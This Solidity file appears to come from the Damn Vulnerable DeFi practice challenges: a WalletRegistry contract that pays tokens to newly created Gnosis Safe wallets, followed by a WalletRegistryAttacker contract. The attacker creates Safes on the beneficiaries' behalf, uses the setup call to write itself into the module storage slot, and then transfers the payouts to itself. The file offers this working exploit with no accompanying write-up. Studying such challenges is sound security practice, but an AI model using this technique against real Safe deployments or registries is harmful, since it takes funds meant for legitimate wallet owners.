// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "solady/src/auth/Ownable.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";

/**
 * @title WalletRegistry
 * @notice A registry for Gnosis Safe wallets.
 *            When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.
 * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract WalletRegistry is IProxyCreationCallback, Ownable {
    uint256 private constant EXPECTED_OWNERS_COUNT = 1;
    uint256 private constant EXPECTED_THRESHOLD = 1;
    uint256 private constant PAYMENT_AMOUNT = 10 ether;

    address public immutable masterCopy;
    address public immutable walletFactory;
    IERC20 public immutable token;

    mapping(address => bool) public beneficiaries;

    // owner => wallet
    mapping(address => address) public wallets;

    error NotEnoughFunds();
    error CallerNotFactory();
    error FakeMasterCopy();
    error InvalidInitialization();
    error InvalidThreshold(uint256 threshold);
    error InvalidOwnersCount(uint256 count);
    error OwnerIsNotABeneficiary();
    error InvalidFallbackManager(address fallbackManager);

    constructor(
        address masterCopyAddress,
        address walletFactoryAddress,
        address tokenAddress,
        address[] memory initialBeneficiaries
    ) {
        _initializeOwner(msg.sender);

        masterCopy = masterCopyAddress;
        walletFactory = walletFactoryAddress;
        token = IERC20(tokenAddress);

        for (uint256 i = 0; i < initialBeneficiaries.length;) {
            unchecked {
                beneficiaries[initialBeneficiaries[i]] = true;
                ++i;
            }
        }
    }

    function addBeneficiary(address beneficiary) external onlyOwner {
        beneficiaries[beneficiary] = true;
    }

    /**
     * @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback
     *          setting the registry's address as the callback.
     */
    function proxyCreated(GnosisSafeProxy proxy, address singleton, bytes calldata initializer, uint256)
        external
        override
    {
        if (token.balanceOf(address(this)) < PAYMENT_AMOUNT) { // fail early
            revert NotEnoughFunds();
        }

        address payable walletAddress = payable(proxy);

        // Ensure correct factory and master copy
        if (msg.sender != walletFactory) {
            revert CallerNotFactory();
        }

        if (singleton != masterCopy) {
            revert FakeMasterCopy();
        }

        // Ensure initial calldata was a call to `GnosisSafe::setup`
        if (bytes4(initializer[:4]) != GnosisSafe.setup.selector) {
            revert InvalidInitialization();
        }

        // Ensure wallet initialization is the expected
        uint256 threshold = GnosisSafe(walletAddress).getThreshold();
        if (threshold != EXPECTED_THRESHOLD) {
            revert InvalidThreshold(threshold);
        }

        address[] memory owners = GnosisSafe(walletAddress).getOwners();
        if (owners.length != EXPECTED_OWNERS_COUNT) {
            revert InvalidOwnersCount(owners.length);
        }

        // Ensure the owner is a registered beneficiary
        address walletOwner;
        unchecked {
            walletOwner = owners[0];
        }
        if (!beneficiaries[walletOwner]) {
            revert OwnerIsNotABeneficiary();
        }

        address fallbackManager = _getFallbackManager(walletAddress);
        if (fallbackManager != address(0))
            revert InvalidFallbackManager(fallbackManager);

        // Remove owner as beneficiary
        beneficiaries[walletOwner] = false;

        // Register the wallet under the owner's address
        wallets[walletOwner] = walletAddress;

        // Pay tokens to the newly created wallet
        SafeTransferLib.safeTransfer(address(token), walletAddress, PAYMENT_AMOUNT);
    }

    function _getFallbackManager(address payable wallet) private view returns (address) {
        return abi.decode(
            GnosisSafe(wallet).getStorageAt(
                uint256(keccak256("fallback_manager.handler.address")),
                0x20
            ),
            (address)
        );
    }
}

contract WalletRegistryAttacker {
    WalletRegistry internal immutable walletRegistry;
    GnosisSafeProxyFactory internal immutable walletFactory;
    GnosisSafe internal immutable masterCopy;
    IERC20 internal immutable token;
    address[] internal initialBeneficiaries;

    constructor(
        address _walletRegistry,
        address[] memory _initialBeneficiaries
    ) {
        walletRegistry = WalletRegistry(_walletRegistry);
        walletFactory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        token = IERC20(walletRegistry.token());
        initialBeneficiaries = _initialBeneficiaries;
    }

    function attack() external {
        for (uint256 i = 0; i < initialBeneficiaries.length; i++) {
            hackWallet(initialBeneficiaries[i]);
        }
    }

    function hackWallet(address owner) internal {
        address[] memory owners = new address[](1);
        owners[0] = owner;
        GnosisSafe safe = GnosisSafe(payable(walletFactory.createProxyWithCallback(
            address(masterCopy),
            abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owners,
                1,
                address(this),
                abi.encodeWithSelector(this.moduleSetup.selector, address(this)),
                address(0),
                address(0),
                0,
                address(0)
            ),
            0,
            walletRegistry
        )));

        bytes memory txData = abi.encodeWithSelector(
            IERC20.transfer.selector,
            msg.sender,
            10 ether
        );

        safe.execTransactionFromModule(
            address(token),
            0,
            txData,
            Enum.Operation.Call
        );
    }

    // storage layout of gnosis safe
    // 0 => address private singleton;
    // 1 => mapping(address => address) internal modules;
    // 2 => mapping(address => address) internal owners;
    // 3 => uint256 internal ownerCount;
    // 4 => uint256 internal threshold;

    // mappings stored at keccak256(h(k) . p)

    function moduleSetup(address attacker) public {
        uint256 moduleStorageSlot = uint256(keccak256(abi.encode(attacker, 1)));
        assembly {
            sstore(moduleStorageSlot, 0x1)
        }
    }
}

